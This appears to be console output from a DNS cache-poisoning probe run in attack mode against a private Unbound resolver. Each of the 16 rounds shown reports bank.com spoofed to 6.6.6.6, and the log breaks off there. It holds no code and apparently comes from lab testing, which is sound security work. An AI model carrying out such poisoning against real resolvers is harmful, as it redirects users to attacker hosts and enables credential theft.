[+] E5-unbound probe: zone=example.net, rounds=50, resolver=10.80.0.53, profile=attack
[1/50] trigger=u18874.example.net status=answer rc=0 bank.com -> 6.6.6.6 rc=0 | trigger=130.000ms bank=130.000ms
[2/50] trigger=u28874.example.net status=answer rc=0 bank.com -> 6.6.6.6 rc=0 | trigger=440.000ms bank=20.000ms
[3/50] trigger=u38874.example.net status=answer rc=0 bank.com -> 6.6.6.6 rc=0 | trigger=30.000ms bank=30.000ms
[4/50] trigger=u48874.example.net status=answer rc=0 bank.com -> 6.6.6.6 rc=0 | trigger=50.000ms bank=20.000ms
[5/50] trigger=u58874.example.net status=answer rc=0 bank.com -> 6.6.6.6 rc=0 | trigger=50.000ms bank=10.000ms
[6/50] trigger=u68874.example.net status=answer rc=0 bank.com -> 6.6.6.6 rc=0 | trigger=70.000ms bank=20.000ms
[7/50] trigger=u78874.example.net status=answer rc=0 bank.com -> 6.6.6.6 rc=0 | trigger=40.000ms bank=20.000ms
[8/50] trigger=u88874.example.net status=answer rc=0 bank.com -> 6.6.6.6 rc=0 | trigger=50.000ms bank=20.000ms
[9/50] trigger=u98874.example.net status=answer rc=0 bank.com -> 6.6.6.6 rc=0 | trigger=30.000ms bank=20.000ms
[10/50] trigger=u108874.example.net status=answer rc=0 bank.com -> 6.6.6.6 rc=0 | trigger=130.000ms bank=20.000ms
[11/50] trigger=u118874.example.net status=answer rc=0 bank.com -> 6.6.6.6 rc=0 | trigger=30.000ms bank=30.000ms
[12/50] trigger=u128874.example.net status=answer rc=0 bank.com -> 6.6.6.6 rc=0 | trigger=50.000ms bank=30.000ms
[13/50] trigger=u138874.example.net status=answer rc=0 bank.com -> 6.6.6.6 rc=0 | trigger=60.000ms bank=20.000ms
[14/50] trigger=u148874.example.net status=answer rc=0 bank.com -> 6.6.6.6 rc=0 | trigger=40.000ms bank=20.000ms
[15/50] trigger=u158874.example.net status=answer rc=0 bank.com -> 6.6.6.6 rc=0 | trigger=50.000ms bank=10.000ms
[16/50] trigger=u168874.example.net status=answer rc=0 bank.com -> 6.6.6.6 rc=0 | trigger=40.000ms bank=20.000ms
